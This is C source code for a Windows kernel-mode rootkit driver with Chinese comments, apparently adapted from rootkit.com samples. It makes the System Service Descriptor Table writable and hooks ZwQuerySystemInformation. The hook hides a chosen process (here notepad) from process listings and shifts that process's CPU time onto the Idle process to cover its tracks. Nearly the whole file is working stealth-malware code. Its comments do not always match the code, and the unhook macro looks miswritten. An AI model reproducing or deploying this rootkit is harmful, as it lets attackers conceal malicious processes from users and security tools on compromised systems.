#include "ntddk.h"

#pragma pack(1)//利用内存描述符表描述一块可写内存 <<-----
typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //仅适用于checked build版本
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()

__declspec(dllimport) ServiceDescriptorTableEntry_t KeServiceDescriptorTable;

PMDL g_pmdlSystemCall;
PVOID *MappedSystemCallTable;
//利用内存描述符表描述一块可写内存  ----->>


//为了勾住SSDT表  给出4个宏定义  <<----
//获得SSDT基址宏
#define SYSTEMSERVICE(_function) KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

//获得函数在SSDT中的索引宏
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)

//调换自己的hook函数与原系统函数的地址
//InterlockedExchange(a,b)能以原子操作的方式交换俩个参数a, b并返回a以前的值
#define HOOK_SYSCALL(_Function, _Hook, _Orig ) \
_Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

//卸载hook函数
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig ) \
InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
//								  ---->>


//声明各种结构
struct _SYSTEM_THREADS
{
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER CreateTime;
	ULONG WaitTime;
	PVOID StartAddress;
	CLIENT_ID ClientIs;
	KPRIORITY Priority;
	KPRIORITY BasePriority;
	ULONG ContextSwitchCount;
	ULONG ThreadState;
	KWAIT_REASON WaitReason;
};

struct _SYSTEM_PROCESSES
{
	ULONG NextEntryDelta;
	ULONG ThreadCount;
	ULONG Reserved[6];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ProcessName;
	KPRIORITY BasePriority;
	ULONG ProcessId;
	ULONG InheritedFromProcessId;
	ULONG HandleCount;
	ULONG Reserved2[2];
	VM_COUNTERS VmCounters;
	IO_COUNTERS IoCounters; //windows 2000 only
	struct _SYSTEM_THREADS Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
	LARGE_INTEGER IdleTime;
	LARGE_INTEGER KernelTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER DpcTime;
	LARGE_INTEGER InterruptTime;
	ULONG InterruptCount;
};

NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
							   IN ULONG SystemInformationClass,
							   IN PVOID SystemInformation,
							   IN ULONG SystemInformationLength,
							   OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
											 ULONG SystemInformationCLass,
											 PVOID SystemInformation,
											 ULONG SystemInformationLength,
											 PULONG ReturnLength
											 );

ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

// Added by Creative of rootkit.com
LARGE_INTEGER m_UserTime;
LARGE_INTEGER m_KernelTime;
//我们的hook函数，过滤掉以"_root_"开头的进程

NTSTATUS NewZwQuerySystemInformation(
									 IN ULONG SystemInformationClass,
									 IN PVOID SystemInformation,
									 IN ULONG SystemInformationLength,
									 OUT PULONG ReturnLength)
{ 
	NTSTATUS ntStatus;
	ntStatus = ((ZWQUERYSYSTEMINFORMATION)(OldZwQuerySystemInformation)) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength );
	if( NT_SUCCESS(ntStatus)) 
	{
		// Asking for a file and directory listing
		if(SystemInformationClass == 5)//所有进程信息
		{
			// 列举系统进程链表
			// 寻找以"_root_"开头的进程
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES *)SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;
			while(curr)
			{
				DbgPrint("Current item is %x\n", curr);
				if (curr->ProcessName.Buffer != NULL)
				{
					KdPrint(("%wZ\n",&(curr->ProcessName)));
					if(0 == memcmp(curr->ProcessName.Buffer, L"notepad", 12))
					{
						KdPrint(("Find notepad.exe\n\n\n\n\n"));
						//保存时间
						m_UserTime.QuadPart += curr->UserTime.QuadPart;
						m_KernelTime.QuadPart += curr->KernelTime.QuadPart;
						if(prev) // Middle or Last entry
						{
							if(curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;
							//如果在中间，我们删除_root_这一项
							else // we are last, so make prev the end
								prev->NextEntryDelta = 0;//如果_root_在最后一项清0
						}
						else
						{
							if(curr->NextEntryDelta)
							{
								KdPrint(("we are first in the list, so move it forward\n\n\n"));
								// we are first in the list, so move it forward
								(char *)SystemInformation += curr->NextEntryDelta;
							}//把下一项作为头结点
							else // 唯一的进程
								SystemInformation = NULL;
						}
					}
				}
				else // Idle process入口
				{
					// 把_root_进程的时间加给Idle进程，Idle称空闲时间
					KdPrint(("把 进程的时间加给Idle进程，Idle称空闲时间\n\n\n"));
					curr->UserTime.QuadPart += m_UserTime.QuadPart;
					curr->KernelTime.QuadPart += m_KernelTime.QuadPart;
					// 重设时间，为下一次过滤
					m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
					KdPrint(("重设时间，为下一次过滤\n\n\n"));
				}
				prev = curr;
				if(curr->NextEntryDelta)
				{
					((char *)curr += curr->NextEntryDelta);
				//curr向后移动结点
					KdPrint(("curr向后移动结点\n\n\n"));
				}
				else curr = NULL;
			}
		}
		else if (SystemInformationClass == 8) // 列举系统进程时间
		{
			struct _SYSTEM_PROCESSOR_TIMES * times = (struct _SYSTEM_PROCESSOR_TIMES *)SystemInformation;
			times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
			KdPrint(("列举系统进程时间\n\n\n"));
		}
		
	}
	return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("ROOTKIT: OnUnload called\n");
	// 卸载hook
	UNHOOK_SYSCALL( ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation );
	// 解索并释放MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
	DbgPrint("ROOTKIT: Start\n");
	// 注册一个卸载的分发函数，与应用层沟通
	theDriverObject->DriverUnload = OnUnload; 
	// 初始化全局时间为零
	// 这将会解决时间问题，如果不这样，尽管隐藏了进程，但时间的消耗会不变，cpu 100%
	m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
	// 储存旧的函数地址
	OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

	// 把SSDT隐射到我们的区域，以便修改它为可写属性  <<---
	g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
	if(!g_pmdlSystemCall)
		return STATUS_UNSUCCESSFUL;
	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	// 改变MDL的Flags属性为可写，既然可写当然可读，可执行
	g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;
	MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);
	//												--->>

	// 用了宏，把原来的Zw*替换成我们的New*函数。至此已完成了我们的主要两步，先突破了SSDT的保护，接着用宏更改了目标函数，下来就剩下具体的过滤任务了
	HOOK_SYSCALL( ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation ); 
	return STATUS_SUCCESS;
}


